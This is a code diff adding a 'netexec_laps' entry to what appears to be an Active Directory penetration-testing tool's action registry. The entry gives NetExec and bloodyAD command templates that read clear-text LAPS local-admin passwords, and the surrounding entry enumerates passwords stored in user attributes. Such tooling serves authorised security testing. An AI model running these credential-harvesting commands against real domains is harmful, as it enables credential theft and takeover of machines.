@@ -330,6 +330,13 @@ ACTION_REGISTRY: dict[str, Action] = {
         runnable=False, outputs="raw",
         note="Admins park passwords in the AD user description / userPassword / unixUserPassword / "
              "unicodePwd fields. Enumerate them with a valid domain cred."),
+    "netexec_laps": _a("netexec_laps",
+        ["nxc ldap $IP -u <USER> -p '<PASS>' -M laps",
+         "bloodyAD -u <USER> -p '<PASS>' -d $DOMAIN --host $IP get search "
+         "--filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"],
+        runnable=False, outputs="raw",
+        note="ms-Mcs-AdmPwd is the clear-text LAPS local-admin password; readable only by "
+             "principals with the extended right. A hit is instant local admin on that machine."),
     "bloodyad_password_fields": _a("bloodyad_password_fields",
         ["bloodyAD -u <USER> -p '<PASS>' -d $DOMAIN --host $IP get search "
          "--filter '(|(userPassword=*)(unixUserPassword=*)(unicodePwd=*)(description=*))' "
